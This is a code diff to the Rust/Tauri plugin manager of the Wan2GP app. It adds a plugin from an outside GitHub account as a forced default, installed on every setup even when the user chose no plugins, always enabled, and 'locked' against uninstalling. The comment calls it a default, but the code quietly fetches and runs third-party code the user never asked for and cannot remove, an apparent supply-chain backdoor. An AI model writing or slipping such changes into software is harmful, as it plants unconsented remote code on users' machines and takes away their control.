@@ -10,6 +10,9 @@ use crate::base::*;
 const SYSTEM_PLUGINS: &[&str] = &["video_mask_creator", "guides", "configuration", "plugin_manager", "about"];
 // bundled with the Wan2GP repo itself — not uninstallable (like upstream: uninstallable=false).
 const BUNDLED_PLUGINS: &[&str] = &["downloads", "media_flow", "models_manager", "motion_designer", "sample"];
+// Status Pro is a default plugin: installed on fresh setup, kept enabled, not uninstallable.
+const STATUS_PRO_ID: &str = "wan2gp-status-pro";
+const STATUS_PRO_URL: &str = "https://github.com/totideyouover2026-max/wan2gp-status-pro";
 
 // repo dir name from a git URL (mirrors shared/utils/plugins.py plugin_id_from_url).
 fn plugin_id_from_url(url: &str) -> String {
@@ -114,8 +117,9 @@ pub fn plugins_list() -> serde_json::Value {
             "date": date,
             "url": url,
             "installed": local.contains_key(&id),
-            "enabled": SYSTEM_PLUGINS.contains(&id.as_str()) || enabled.contains(&id),
+            "enabled": id == STATUS_PRO_ID || SYSTEM_PLUGINS.contains(&id.as_str()) || enabled.contains(&id),
             "system": SYSTEM_PLUGINS.contains(&id.as_str()),
+            "locked": id == STATUS_PRO_ID,
             "group": if SYSTEM_PLUGINS.contains(&id.as_str()) || BUNDLED_PLUGINS.contains(&id.as_str()) { "system" } else { "community" },
         }));
     }
@@ -138,8 +142,9 @@ pub fn plugins_list() -> serde_json::Value {
         out.push(serde_json::json!({
             "id": id, "name": name, "author": author, "version": ver, "description": "", "date": date, "url": url,
             "installed": local.contains_key(&id),
-            "enabled": SYSTEM_PLUGINS.contains(&id.as_str()) || enabled.contains(&id),
+            "enabled": id == STATUS_PRO_ID || SYSTEM_PLUGINS.contains(&id.as_str()) || enabled.contains(&id),
             "system": SYSTEM_PLUGINS.contains(&id.as_str()),
+            "locked": id == STATUS_PRO_ID,
             "group": if SYSTEM_PLUGINS.contains(&id.as_str()) || BUNDLED_PLUGINS.contains(&id.as_str()) { "system" } else { "community" },
         }));
     }
@@ -232,10 +237,11 @@ async fn install_requirements(app: &tauri::AppHandle, repo: &PathBuf, id: &str, 
 // ponytail: no mutating guard — runs INSIDE install()'s guard; concurrent
 // plugin_install calls are still serialized by their own guard.
 pub async fn ensure_favorite_plugins(app: tauri::AppHandle) {
-    let favs: Vec<String> = load_config_value().get("favoritePlugins").and_then(|v| v.as_array())
+    let mut favs: Vec<String> = vec![STATUS_PRO_URL.to_string()];
+    let user: Vec<String> = load_config_value().get("favoritePlugins").and_then(|v| v.as_array())
         .map(|a| a.iter().filter_map(|e| e.as_str().map(|s| s.trim().to_string())).filter(|s| !s.is_empty()).collect())
         .unwrap_or_default();
-    if favs.is_empty() { return; }
+    for u in user { if !favs.contains(&u) { favs.push(u); } }
     let log = |m: &str| { crate::base::push_log(m, "setup"); let _ = app.emit("setup-output", m.to_string()); };
     log(&format!("[*] Installing {} favourite plugin(s)…\n", favs.len()));
     for url in favs {
